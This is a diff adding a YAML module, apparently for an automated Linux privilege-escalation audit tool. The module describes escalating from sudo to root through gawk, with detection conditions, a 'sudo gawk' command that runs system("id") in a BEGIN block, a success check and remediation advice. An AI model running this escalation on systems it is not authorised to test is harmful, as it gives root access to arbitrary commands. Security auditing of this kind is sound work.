@@ -1,0 +1,25 @@
+# Sudo → root via gawk (GTFOBins)
+technique: T1548.003
+name: Sudo → root via gawk (GTFOBins)
+tactic: [privilege-escalation]
+platform: [linux]
+ranking:
+  exploitability: high
+  safety: read-only
+  detection: quiet
+detect:
+  sudo_allows: gawk
+execute:
+  command: |-
+    sudo gawk 'BEGIN{system("id")}'
+verify:
+  success: "uid=0"
+cleanup:
+  command: ""
+report:
+  vector_type: gtfobins_sudo
+  description: >
+    Sudo NOPASSWD on `gawk` — arbitrary system() via a BEGIN block.
+  remediation: >
+    Drop `gawk` from sudoers.
+  refs: [T1548.003, GTFOBins/gawk]
